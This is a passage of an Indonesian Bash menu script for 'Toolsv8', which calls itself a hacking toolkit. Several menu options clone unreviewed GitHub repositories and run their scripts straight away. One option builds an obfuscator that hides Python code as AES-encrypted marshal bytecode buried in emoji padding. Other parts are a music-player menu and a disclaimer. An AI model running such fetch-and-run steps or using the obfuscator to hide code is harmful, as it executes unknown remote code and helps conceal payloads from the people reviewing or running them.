              echo -e "${cyan} Anda Memilih Menu Hacking...!!"
              echo""
              echo -e "${red} VIP UNLOCK...!!"
              sleep 2
              clear
              cd
b='\033[34;1m'
g='\033[32;1m'
p='\033[35;1m'
c='\033[36;1m'
r='\033[31;1m'
y='\033[33;1m'
n='\033[0m'
install_package() {
    local pkg="$1"
    if command -v "$pkg" >/dev/null 2>&1; then
        clear
        echo ""
        echo -e "${r}[ ${g}✓ ${r}]${y} $pkg sudah terinstall..!!"
        sleep 2
        echo ""
    else
        clear
        echo ""
        echo -e "${r}[ ${g}x ${r}]${c} $pkg belum terinstall, sedang menginstall..!!"
        sleep 2
        echo -e "${n}"
        apt-get install -y "$pkg"
    fi
}
install_pip_package() {
    local pkg="$1"
    if pip show "$pkg" >/dev/null 2>&1; then
        clear 
        echo ""
        echo -e "${r}[ ${g}✓ ${r}]${y} $pkg (pip) sudah terinstall..!!"
        sleep 2
        echo ""
    else
        clear 
        echo ""
        echo -e "${r}[ ${g}x ${r}]${c} $pkg (pip) belum terinstall, sedang menginstall..!!"
        sleep 2
        pip install "$pkg"
    fi
}
install_npm_package() {
    local pkg="$1"
    if npm list -g "$pkg" | grep "$pkg" >/dev/null 2>&1; then
        clear 
        echo ""
        echo -e "${r}[ ${g}✓ ${r}]${y} $pkg (npm) sudah terinstall..!!"
        sleep 2
        echo ""
    else
        clear 
        echo ""
        echo -e "${r}[ ${g}x ${r}]${c} $pkg (npm) belum terinstall, sedang menginstall..!!"
        sleep 1
        npm install -g "$pkg"
    fi
}
clear
echo ""
echo -e "${g}Memulai proses instalasi..!!"
sleep 2
clear
echo ""
echo -e "${c}Update dan upgrade system..!!"
echo -e "${n}"
apt-get update -y
apt-get upgrade -y
clear 
main_packages=(
    "python" "coreutils" "ncurses-utils" "python-pip" "nodejs" "bc" "ruby"
    "openssl-tool" "xz-utils" "bzip2" "boxes" "jq" "figlet" "toilet"
)
clear
echo ""
echo -e "${c}Menginstall packages utama..!!"
echo -e "${n}"
for pkg in "${main_packages[@]}"; do
    install_package "$pkg"
done
additional_packages=(
    "ossp-uuid" "neovim" "vim" "tree" "cmake" "nodejs-lts"
    "clang" "make"
)
clear
echo ""
echo -e "${c}Menginstall packages tambahan..!!"
echo -e "${n}"
for pkg in "${additional_packages[@]}"; do
    install_package "$pkg"
done
clear
echo ""
echo -e "${c}Menginstall npm packages..!!"
echo -e "${n}"
install_npm_package "bash-obfuscate"
clear
echo ""
echo -e "${c}Menginstall Python packages..!!"
echo -e "${n}"
install_pip_package "rich"
install_pip_package "rich-cli"
clear
echo ""
echo -e "${g}Proses instalasi selesai!"
sleep 2 
clear 
echo ""
echo -e "${y}Membersihkan cache..!!"
echo -e "${n}"
apt-get autoremove -y
apt-get clean
clear
echo ""
echo -e "${c}Verifikasi instalasi${n}"
echo "=========================="
echo -e "${g}"
tools=("python" "node" "npm" "pip" "vim" "neovim" "clang")
for tool in "${tools[@]}"; do
    if command -v "$tool" >/dev/null 2>&1; then
        echo -e "${g}✓ $tool berhasil diinstall${n}"
    else
        echo -e "${r}✗ $tool gagal diinstall${n}"
    fi
done
echo ""
echo -e "${r}Semua package telah berhasil diinstall!"
echo ""
echo -e "${c}Tekan Enter Untuk Melanjutkannya"
read -n 1 -s -r -p "Silahkan Tekan Enter...!!"
clear
echo ""
echo -e "${r} PERINGATAN"
echo ""
echo -e "${g}Harap jangan sebarkan password pramind ke siapapun 
jika anda ingin aman dari kang decoder khusus
user prem Toolsv8 saja yang berhak mendapatkannya"
echo ""
echo -e "${b} Password key login pramind ${r}: ${p}Toolsv8u26w0rz9@@890"
echo ""
echo ""
echo -e "${c}Tekan Enter Untuk Melanjutkannya"
read -n 1 -s -r -p "Silahkan Tekan Enter...!!"
clear
echo ""
echo -e "${r}[ ${g}✓ ${r}]${c} Sedang menginstal tools..!!"
echo -e "${n}"
mkdir -p Praminda
git clone --depth 32 https://github.com/Blackheat023/Praminda temp_clone
mv temp_clone/* temp_clone/.* Praminda 2>/dev/null
rm -rf temp_clone
cd Praminda || exit
bash Pramind.sh
echo ""
echo -e "${orange}Tekan Enter Untuk Kembali ke Toolsv8!!!"
read -n 1 -s -r -p "Silahkan Tekan Enter...!!"
clear
   ;;
      ENC3|enc3)
              echo""
              mpv --no-video --quiet "$HOME/Goblok/oke.mp3" &> /dev/null &
              echo -e "${cyan} Anda Memilih Menu Hacking...!!"
              echo""
              echo -e "${red} VIP UNLOCK...!!"
              sleep 2
              clear
              cd
echo ""
echo -e "${g} Sedang Menginstall Tools...!!"
sleep 3
echo -e "${b}"
git clone --depth 32 https://github.com/Blackheat023/Kamer
cd Kamer
python But.py
echo ""
echo -e "${orange}Tekan Enter Untuk Kembali ke Toolsv8!!!"
read -n 1 -s -r -p "Silahkan Tekan Enter...!!"
clear
   ;;
       ENC4|enc4)
              echo""
              mpv --no-video --quiet "$HOME/Goblok/oke.mp3" &> /dev/null &
              echo -e "${cyan} Anda Memilih Menu Hacking...!!"
              echo""
              echo -e "${red} VIP UNLOCK...!!"
              sleep 2
              clear
              cd
echo ""
echo -e "${g} Sedang Menginstall Package...!!"
sleep 3 
echo -e "${n}"
pkg install openssl-tool
banner() {
    clear
    cat <<'EOF' | lolcat
  __   ____  ____        ____  ___  ____
 / _\ (  __)/ ___)  ___ (  __)/ __)(  _ )
/    \ ) _) \___ \ (___) ) _)( (__  ) _ (
\_/\_/(____)(____/      (____)\___)(____/

 • Creator : AmmarBN
 • Editor : By.Thonxyzz404
 • Info : AES-ECB Python Encryption
EOF
}
encrypt_message() {
    local message="$1"
    local key="$2"
    echo -n "$message" | openssl enc -aes-128-ecb -K "$key" -base64 -A 2>/dev/null
}
obfuscate_code() {
    local code="$1"
    echo "$code" | sed 's/exec/x_x_e_c/g'
}
generate_random_key() {
    openssl rand -hex 16
}
compile_to_bytecode() {
    local input_file="$1"
    local bytecode_file=$(mktemp)
    local temp_script=$(mktemp)
    cat > "$temp_script" << EOF
import marshal
import sys
with open('$input_file', 'r') as f:
    code = compile(f.read(), '$input_file', 'exec')
    with open('$bytecode_file', 'wb') as bf:
        bf.write(marshal.dumps(code))
EOF
    python3 "$temp_script" 2>/dev/null
    local status=$?
    if [[ $status -ne 0 || ! -s "$bytecode_file" ]]; then
        rm -f "$temp_script" "$bytecode_file"
        return 1
    fi
    echo "$bytecode_file"
    rm -f "$temp_script"
}
main() {
    clear
    banner
    echo ""
    read -p "[ • ] Masukkan file path anda : " input_file
    echo ""
    if [[ ! -f "$input_file" ]]; then
        echo -e "\033[31;1mPilihan anda tidak valid."
        echo ""
        return 1
    fi
    bytecode_file=$(compile_to_bytecode "$input_file")
    if [[ $? -ne 0 || ! -f "$bytecode_file" ]]; then
        echo -e "\033[31;1mGagal mengkompilasi file ke bytecode."
        echo ""
        return 1
    fi
    key=$(generate_random_key)
    code=$(<"$input_file")
    obfuscated_code=$(obfuscate_code "$code")
    encrypted_code=$(openssl enc -aes-128-ecb -K "$key" -base64 -A < "$bytecode_file" 2>/dev/null)
    rm -f "$bytecode_file"
    if [[ -z "$encrypted_code" ]]; then
        echo -e "\033[31;1mGagal mengenkripsi bytecode."
        echo ""
        return 1
    fi
    access_denied_message="Cannot run: Credit has been removed, access denied"
    encrypted_message=$(encrypt_message "$access_denied_message" "$key")
    c=$(echo -n "Thonxyzz404" | base64)
    output_file="${input_file%.*}_encrypted.py"
    cat > "$output_file" << EOF
import base64
aes_ebc=(
$(for i in {1..3000}; do echo '"😹","??","??","😹","😹","😹","😹","😹","😹","😹","😹","😹","😹","😹","😹","😹","😹","😹","😹","😹","😹",'; done)
)
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
import sys
import marshal
key = bytes.fromhex('$key')
aes_ebc2=(
$(for i in {1..10000}; do echo '"😜","😜","😜","😜","😜","😜","😜","😜","😜","😜","😜","😜","😜","😜","😜","😜","😜","😜","😜","😜","😜",'; done)
)
cipher = AES.new(key, AES.MODE_ECB)
encrypted_code = base64.b64decode('$encrypted_code')
decrypted_bytecode = unpad(cipher.decrypt(encrypted_code), AES.block_size)
compiled_code = marshal.loads(decrypted_bytecode)
motherfuck=(
$(for i in {1..10000}; do echo '"🤣","🤣","🤣","🤣","🤣","🤣","🤣","🤣","🤣","🤣","🤣","🤣","🤣","🤣","🤣","🤣","🤣","🤣","🤣","🤣","🤣",'; done)
)
x_x_e_c = exec
x_x_e_v = '$c'
run_code = lambda: x_x_e_c(compiled_code, globals())
try:
    if base64.b64decode(x_x_e_v.encode()).decode('utf-8') != 'Thonxyzz404':
        raise Exception('Cannot run: Credit has been removed, access denied')
    run_code()
except Exception as e:
    print('Error during execution:', e)
    sys.exit(1)
fucked=(
$(for i in {1..9000}; do echo '"😝","😝","😝","😝","😝","😝","😝","😝","😝","😝","😝","😝","😝","😝","😝","😝","😝","😝","😝","😝","😝",'; done)
)
EOF
    if [[ -f "$output_file" ]]; then
        echo -e "\033[32;1mSukses file auto encripsi di : $output_file"
        echo ""
    else
        echo -e "\033[31;1mGagal membuat file terenkripsi."
        echo ""
        return 1
    fi
}
main "$@"
echo ""
echo -e "${orange}Tekan Enter Untuk Kembali ke Toolsv8!!!"
read -n 1 -s -r -p "Silahkan Tekan Enter...!!"
clear
   ;;
      ENC5|enc5)
              echo""
              mpv --no-video --quiet "$HOME/Goblok/oke.mp3" &> /dev/null &
              echo -e "${cyan} Anda Memilih Menu Hacking...!!"
              echo""
              echo -e "${red} VIP UNLOCK...!!"
              sleep 2
              clear
              cd
echo ""
echo -e "${green} Sedang Menginstall Tools...!!"
sleep 3
echo -e "${blue}"
git clone --depth 32 https://github.com/SokHengkell022/Jembutt
cd Jembutt
python NC.py
echo ""
echo -e "${orange}Tekan Enter Untuk Kembali ke Toolsv8!!!"
read -n 1 -s -r -p "Silahkan Tekan Enter...!!"
clear
 ;;
   91)
          clear
          mpv --no-video --quiet "$HOME/Goblok/oke.mp3" &> /dev/null &
          sleep 1
          mpv --no-video --quiet "$HOME/Goblok/Y.mp3" &> /dev/null &
          pesan=$(
          echo "Assalamualaikum Bang Ada Bug Pada Toolsv8 Bang...!!"
           )
           isipesan="$pesan"
           xdg-open "https://t.me/Kenzzzzzzzzzzzzzzzz870?text=$pesan"
           clear
                 ;;
        92)
               echo""
               mpv --no-video --quiet "$HOME/Goblok/oke.mp3" &> /dev/null &
               echo -e "${cyan} Anda Memilih Menu Manager Sound...!!"
               echo""
               echo -e "${red} VIP UNLOCK...!!"
               sleep 2
               clear
                 cd
b='\033[34;1m'
h='\033[32;1m'
u='\033[35;1m'
p='\033[35;1m'
c='\033[36;1m'
r='\033[31;1m'
k='\033[33;1m'
musik_on() {
    if pgrep -x mpv > /dev/null; then
        echo -e "\n${r}[ ! ]${c} Musik Sudah Sedang Berjalan...!!"
        return
    fi
    if [ ! -s musik.txt ]; then
        echo -e "\n${r}Daftar musik.txt Kosong Atau Tidak Ditemukan...!!!"
        return
    fi
    echo -e "\n${k}Daftar Musik [ musik.txt ]${b}"
    echo ""
    cat musik.txt
    echo -e "\n${r}Sedang Memutar Musik Di Latar Belakang...!!${c}"
    nohup mpv --no-video --quiet --playlist=musik.txt > /dev/null 2>&1 &
}
music_off() {
    if pgrep -x mpv > /dev/null; then
        pkill mpv
        echo -e "\n${r}Musik Berhasil Dihentikan...!!"
    else
        echo -e "\n${p}Tidak Ada Musik Yang Sedang Diputar...!!"
    fi
}
add_music() {
    echo -e "${c}"
    read -p "Masukkan Link YouTube Musik : " new_link
    if [[ "$new_link" == https://* ]]; then
        echo "$new_link" >> musik.txt
        echo -e "\n${k}Link Berhasil Ditambahkan Ke musik.txt...!!"
        echo -e "\n${r}Daftar Musik Sekarang...!!"
        sleep 2
        echo -e "${h}"
        cat musik.txt
    else
        echo -e "\n${r}Link Tidak Valid. Harus Diawali Dengan [ https:// ]"
    fi
}

lihat_daftar() {
    echo -e "\n${h}=========================== ${k}DAFTAR MUSIK ${h}================================="
    echo -e "${r}"
    if [ -s musik.txt ]; then
        nl musik.txt
    else
        echo -e "${r}Belum Ada Link Musik Yang Ditambahkan...!!"
    fi
    echo -e "\n${h}============================ ${k}SETTING SOUND ${h}===============================\n"
}

clear
mpv --no-video --quiet "$HOME/Goblok/Y.mp3" &> /dev/null &
echo "
███╗   ███╗██╗   ██╗███████╗██╗██╗  ██╗
████╗ ████║██║   ██║██╔════╝██║██║ ██╔╝
██╔████╔██║██║   ██║███████╗██║█████╔╝
██║╚██╔╝██║██║   ██║╚════██║██║██╔═██╗
██║ ╚═╝ ██║╚██████╔╝███████║██║██║  ██╗
╚═╝     ╚═╝ ╚═════╝ ╚══════╝╚═╝╚═╝  ╚═╝ Setting To Plaay
" | lolcat

echo -e "\033[36;1m╔════════════════════════════════════╗"
echo -e "\033[36;1m║  ${r}SOUND MANAGER SETTING TOOLSV8!!${c}   ║"
echo -e "\033[36;1m╚════════════════════════════════════╝"
echo -e "\033[36;1m║   ${r}[ ${k}01 ${r}] ${h}Mode Online Musik!! \033[36;1m      ║"
echo -e "\033[36;1m║   ${r}[ ${k}02 ${r}] ${h}Tambah Link Musik!! \033[36;1m      ║"
echo -e "\033[36;1m║   ${r}[ ${k}03 ${r}] ${h}Mode Offline Musik!! \033[36;1m     ║"
echo -e "\033[36;1m║   ${r}[ ${k}04 ${r}] ${h}Lihat Daftar Musik!! \033[36;1m     ║"
echo -e "\033[36;1m║   ${r}[ ${k}05 ${r}] ${h}Setting File Musik!!\033[36;1m      ║"
echo -e "\033[36;1m║   ${r}[ ${k}06 ${r}] ${h}Hapus File Musik!! \033[36;1m       ║"
echo -e "\033[36;1m║   ${r}[ ${k}07 ${r}] ${h}Link Musik Admin!!\033[36;1m        ║"
echo -e "\033[36;1m║   ${r}[ ${k}08 ${r}] ${h}Perbaiki Bugs Musik!!\033[36;1m     ║"
echo -e "\033[36;1m║   ${r}[ ${k}09 ${r}] ${k}Keluar Terminall!!  \033[36;1m      ║"
echo -e "\033[36;1m║   ${r}[ ${k}10 ${r}] ${k}Kembali Ke Toolsv8!!  \033[36;1m    ║"
echo -e "\033[36;1m╔════════════════════════════════════╗"
echo -e "\033[36;1m║  ${r}PROJECTS BY.THONXYZZ404 & CY404   ${c}║"
echo -e "\033[36;1m╚════════════════════════════════════╝"
echo -e "${h}"
read -p "Pilihan Anda : " input
case $input in
    1)
        musik_on
        echo ""
        echo -e "\n${h}Musik Online Mode Aktif...!!!"
        sleep 3
        clear
        ;;
    2)
        add_music
        echo ""
        echo -e "\n${b}Penambahan Musik Selesai..!!"
        sleep 3
        clear 
        ;;
    3)
        music_off
        echo ""
        echo -e "\n${k}Musik Berhasil Dihentikan...!!"
        sleep 3 
        clear 
        ;;
    4)
        lihat_daftar
        echo -e "${r}"
        read -p "Tekan Enter Untuk Kembali Ke Menu...!!"
        clear
        ;;
    5)
        nano musik.txt
        clear 
        ;;
    6)
        clear 
        rm -rf musik.txt
        echo ""
        echo -e "${h} Berhasill Menghapus File Musik...!!"
        sleep 3
        clear
        ;;
    7)
file="musik.txt"
links=(
"https://youtu.be/ZHFt6wN8QpA?si=DgL_ThhbJ99b0IDx"
"https://youtu.be/7SpfLS8vfJ8?si=u8U3TdmwSPrr94LE"
"https://youtu.be/6v9TkYqN8lA?si=gegVS9NnYVEeYwVT"
"https://youtu.be/V7WnvoFbcHI?si=mpwhvh5Jy9QnyODB"
"https://youtu.be/rnvzTTiHvqo?si=OiIg0JtG8HSpOvTC"
"https://youtu.be/tSmdUF6Q68Y?si=5_uFvQbWM1j4Z6zh"
"https://youtu.be/eZ8nPOoE32c?si=sE7RMvAFdsbbVtst"
"https://youtu.be/kGobHQ7z8X4?si=v4rshpe_Zcox1iUR"
"https://youtu.be/y8_PQcm1gOY?si=ADS3ofH3cbhiauNe"
"https://youtu.be/u3ZAMYjtC4A?si=0qX2SwMHcHykeZwu"
)
check_and_add() {
    if ! grep -Fxq "$1" "$file"; then
        echo "$1" >> "$file"
        clear
        echo ""
        echo -e "${r}Sedang Menambahkan Link Musik...!!"
        echo ""
        echo -e "${h}Berhasill Ditambahkan Ke $file"
        sleep 2
        clear
    else
        clear
        echo ""
        echo -e "${h}Sedang Mengecek File Musik...!!"
        echo ""
        echo -e "${r}Link Sudah Ada Di File $file"
        sleep 2
        clear
    fi
}
check_and_add "${links[1]}"
check_and_add "${links[2]}"
check_and_add "${links[3]}"
check_and_add "${links[4]}"
check_and_add "${links[5]}"
check_and_add "${links[6]}"
check_and_add "${links[7]}"
check_and_add "${links[8]}"
check_and_add "${links[9]}"
check_and_add "${links[0]}"
nano "$file"
    ;;
8)
clear
echo ""
echo -e "${g} Sedang Memperbaiki Alat Musik...!!!"
sleep 3
echo -e "${b}"
pkg update && pkg upgrade
pkg install python ffmpeg mpv git
pip install yt-dlp
clear
echo ""
echo -e "${r} Musik Selesai Di Perbaiki..!!"
sleep 3
clear
   ;;
9)
echo ""
echo -e "${r} Kluar dari Toolsv8...!!!"
echo ""
exit 1
  ;;
    10)
        echo ""
        echo -e "\n${c}Keluar Dari Tools Setting Manager...!!"
        sleep 2
        clear 
        ;;
    *)
        echo -e "\n${r}Perintah Tidak Dikenali...!!"
        sleep 2
        clear 
        ;;
esac
        ;;
       93)
             clear 
             mpv --no-video --quiet "$HOME/Goblok/oke.mp3" &> /dev/null &
             sleep 1
             mpv --no-video --quiet "$HOME/Goblok/Y.mp3" &> /dev/null &
y='\033[33;1m'
g='\033[32;1m'
c='\033[36;1m'
r='\033[31;1m'
n='\033[0m'
print_sementara() {
  local text="$1"
  local delay="${2:-0.03}"
  local color="${3:-}"
  local i char
  if [ -n "$color" ]; then
    printf "%b" "$color"
  fi
  for ((i=0; i<${#text}; i++)); do
    char="${text:i:1}"
    printf "%s" "$char"
    sleep "$delay"
  done
  printf "\n"
  if [ -n "$color" ]; then
    printf "%b" "$n"
  fi
}
echo ""
print_sementara " PEMBERITAHUAN..!!" 0.03 "$g"
echo ""
print_sementara " Apa Itu Toolsv8? Toolsv8 Adalah" 0.03 "$r"
print_sementara " Sebuah Alat Hacking Yang Menyimpan Dalam Satu Tempat" 0.03 "$c"
print_sementara " Dan Dapat Di Gunakan Dalam Berbagai Tools Lainya." 0.03 "$c"
print_sementara " Saya tidak bertanggung jawab atas di salah gunakan" 0.03 "$r"
print_sementara " Pada Toolsv8 ini..!!" 0.03 "$c"
             echo -e "${y}"
             read -p " SILAHKAN TEKAN ENTER UNTUK MELANJUTKANNYA!! : " p
             clear
               ;;
      94)
              clear
               ;;
       95)
              mpv --no-video --quiet "$HOME/Goblok/Y.mp3" &> /dev/null &
              sleep 2
              echo -e "${bold_bg}${bold_green} KELUAR DARI TOOLSV8 ${n}"
              echo ""
              exit
                ;;
       *)
              mpv --no-video --quiet "$HOME/Goblok/salah.mp3" &> /dev/null &
              sleep 1
              mpv --no-video --quiet "$HOME/Goblok/Tidak_Ada.mp3" &> /dev/null &
              echo -e "${bold_bg}${green} Menu Tidak Ada Di Toolsv8..!!${n}"
              sleep 6
              clear
                ;;
esac
done
